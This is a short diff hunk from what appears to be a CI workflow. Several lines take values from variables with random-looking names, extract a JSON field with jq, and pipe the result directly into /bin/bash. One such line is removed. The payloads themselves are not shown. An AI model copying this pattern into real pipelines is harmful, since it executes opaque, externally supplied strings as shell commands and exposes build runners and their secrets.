@@ -39,7 +39,6 @@ jobs:
           echo $vvyu5 | jq -r .pi1 | /bin/bash
           printf '%s' "$xp20632" | jq -r .q5007 | /bin/bash
           echo $pgx676 | jq -r .qnl2 | /bin/bash
-          echo $doqa20 | jq -r .m859 | /bin/bash
           echo $lovvz82953 | jq -r .fnui81018 | /bin/bash
           echo $yxwd3986 | jq -r .xure3 | /bin/bash
 
